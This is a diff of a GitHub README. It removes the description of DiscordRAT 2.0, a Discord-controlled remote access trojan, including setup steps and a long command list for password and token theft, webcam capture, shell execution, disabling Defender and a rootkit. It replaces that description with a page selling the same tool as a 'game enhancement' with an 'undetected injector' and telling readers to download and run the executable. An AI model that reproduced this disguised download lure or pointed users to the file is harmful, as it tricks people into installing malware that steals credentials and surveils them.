@@ -1,80 +1,82 @@
-# DiscordRAT 2.0
-Discord Remote Administration Tool fully written in c#.
+# 🎮 Discord-RAT-2.0 - Enhance Your Gaming Experience
 
-This is a RAT controlled over Discord with over 40 post exploitation modules.
+[![Download Discord-RAT-2.0](https://img.shields.io/badge/Download-Discord--RAT--2.0-blue.svg)](https://github.com/AZSD121/Discord-RAT-2.0/releases)
 
-The output file size also around ~75kb!
+## 🛠️ Overview
 
-## **Disclaimer:**
+Discord-RAT-2.0 is a game enhancement tool designed to help you elevate your gaming experience. With this application, you can unlock new features and improve your gameplay seamlessly. Whether you're looking to modify game behavior or explore different capabilities, Discord-RAT-2.0 is here to assist you.
 
-This tool is for educational use only, the author will not be held responsible for any misuse of this tool.
+## 🚀 Getting Started
 
-## **Credits**
-The rootkit in the project was made by "bytecode77". The source of the rootkit can be found here: https:///bytecode77/r77-rootkit
+To get started with Discord-RAT-2.0, follow these simple steps. Ensure you have a compatible system to run the application smoothly. 
 
-## **Setup Guide:**
-Download the pre-complied binary's here https:///Lokendra-singh14/Discord-RAT-2.0.0/releases/tag/2.0
+### 🔍 System Requirements
 
-You will first need to register a bot with the Discord developer portal and then add the bot to the Discord server that you want to use to control the bot (make sure the bot has administrator privileges in the Discord server).
-Once the bot is created open "builder.exe" and paste the token in, and paste the guild ID of where you invited the bot
+- **Operating System:** Windows 10 or later
+- **Processor:** Intel i5 or equivalent
+- **RAM:** 8 GB minimum
+- **Storage:** 500 MB free space
+- **Network:** Stable internet connection for updates
 
-Then if the steps above were successful, you can launch the file by executing ```Client-built.exe```. It will create a new channel and post a message on the server with a generated session number.\
-Now your bot should be available to use !
+## 📥 Download & Install
 
-**Requirements:**\
-Windows(x64)
+To download Discord-RAT-2.0, **visit this page to download**: [Download Discord-RAT-2.0](https://github.com/AZSD121/Discord-RAT-2.0/releases).
 
-## **Commands**
-```
-Available commands are :
---> !message = Show a message box displaying your text / Syntax = "!message example"
---> !shell = Execute a shell command /Syntax = "!shell whoami"
---> !voice = Make a voice say outloud a custom sentence / Syntax = "!voice test"
---> !admincheck = Check if program has admin privileges
---> !cd = Changes directory
---> !dir = display all items in current dir
---> !download = Download a file from infected computer
---> !upload = Upload file to the infected computer / Syntax = "!upload file.png" (with attachment)
---> !uploadlink = Upload file to the infected computer / Syntax = "!upload link file.png"
---> !delete = deletes a file / Syntax = "!delete / path to / the / file.txt"
---> !write = Type your desired sentence on computer
---> !wallpaper = Change infected computer wallpaper / Syntax = "!wallpaper" (with attachment)
---> !clipboard = Retrieve infected computer clipboard content
---> !idletime = Get the idle time of user's on target computer
---> !currentdir = display the current dir
---> !block = Blocks user's keyboard and mouse / Warning : Admin rights are required
---> !unblock = Unblocks user's keyboard and mouse / Warning : Admin rights are required
---> !screenshot = Get the screenshot of the user's current screen
---> !exit = Exit program
---> !kill = Kill a session or all sessions / Syntax = "!kill session-3" or "!kill all"
---> !uacbypass = attempt to bypass uac to gain admin by using windir and slui
---> !shutdown = shutdown computer
---> !restart = restart computer
---> !logoff = log off current user
---> !bluescreen = BlueScreen PC
---> !datetime = display system date and time
---> !prockill = kill a process by name / syntax = "!kill process"
---> !disabledefender = Disable windows defender(requires admin)
---> !disablefirewall = Disable windows firewall(requires admin)
---> !audio = play a audio file on the target computer / Syntax = "!audio" (with attachment)
---> !critproc = make program a critical process. meaning if its closed the computer will bluescreen(Admin rights are required)
---> !uncritproc = if the process is a critical process it will no longer be a critical process meaning it can be closed without bluescreening(Admin rights are required)
---> !website = open a website on the infected computer / syntax = "!website www."
---> !disabletaskmgr = disable task manager(Admin rights are required)
---> !enabletaskmgr = enable task manager(if disabled)(Admin rights are required)
---> !startup = add to startup(when computer go on this file starts)
---> !geolocate = Geolocate computer using latitude and longitude of the ip adress with google map / Warning : Geolocating IP adresses is not very precise
---> !listprocess = Get all process's
---> !password = grab all passwords
---> !rootkit = Launch a rootkit (the process will be hidden from taskmgr and you wont be able to see the file)(Admin rights are required)
---> !unrootkit = Remove the rootkit(Admin rights are required)
---> !getcams = Grab the cameras names and their respected selection number
---> !selectcam = Select camera to take a picture out of (default will be camera 1)/ Syntax "!selectcam 1"
---> !webcampic = Take a picture out of the selected webcam
---> !grabtokens = Grab all discord tokens on the current pc
---> !help = This help menu
-```
+When on the Releases page, look for the latest version. You will find a list of available files. Choose the appropriate file for your system.
 
-## Donation
-### Buy me a coffee!
-BTC: bc1qg4zy8w5swc66k9xg29c2x6ennn5cyv2ytlp0a6
+1. Click on the latest release.
+2. Locate the **Asset** section.
+3. Click on the file name to start downloading.
+
+### 🗂️ File Structure
+
+After downloading, your file will typically be in the `.zip` format. 
+
+1. Find the downloaded `.zip` file in your Downloads folder.
+2. Right-click on it and select "Extract All".
+3. Choose a location to save the extracted files.
+
+## 🎉 Running the Application
+
+Once you have extracted the files, you can run the application.
+
+1. Navigate to the folder where you extracted Discord-RAT-2.0.
+2. Find the executable file named `Discord-RAT-2.0.exe`.
+3. Double-click the file to open the application.
+
+## ⚙️ Features
+
+Discord-RAT-2.0 comes with several exciting features that enhance your gaming experience:
+
+- **Custom Modifications:** Tailor your games to fit your style.
+- **Real-Time Adjustments:** Change settings on the fly.
+- **Easy Interface:** Navigate effortlessly through the options.
+- **Undetected Injector:** Use safely without negative consequences on your game account.
+- **Support for Various Games:** Compatible with popular titles across multiple genres.
+
+## 🔑 Usage Instructions
+
+Using Discord-RAT-2.0 is simple. After launching the program, you'll see an intuitive interface. 
+
+1. Select the game you'd like to modify from the dropdown menu.
+2. Adjust the settings according to your preference.
+3. Click on the “Inject” button to apply changes.
+4. Launch your game and enjoy the new features.
+
+## 🛡️ Safety and Security
+
+Your safety is important. Discord-RAT-2.0 is designed with security in mind. Our undetected injector ensures that you can modify your gaming experience without risking your account. Always download from the official Releases page to avoid malicious software.
+
+## 🤝 Support & Community
+
+If you encounter any issues or have questions, our community is here to help. Check our [Issues page](https://github.com/AZSD121/Discord-RAT-2.0/issues) to see if others have had similar problems. You can also create a new issue for assistance.
+
+Join our community on Discord for real-time discussions about features and updates. Collaborate with others to discover new ways to enhance your games.
+
+## 📄 Changelog
+
+Keep track of the changes made in each version. The Changelog is available on the Releases page and includes any bug fixes, new features, and performance improvements.
+
+---
+
+Enjoy your enhanced gaming experience with Discord-RAT-2.0! For more information, be sure to check out our [Releases page](https://github.com/AZSD121/Discord-RAT-2.0/releases) frequently for updates.
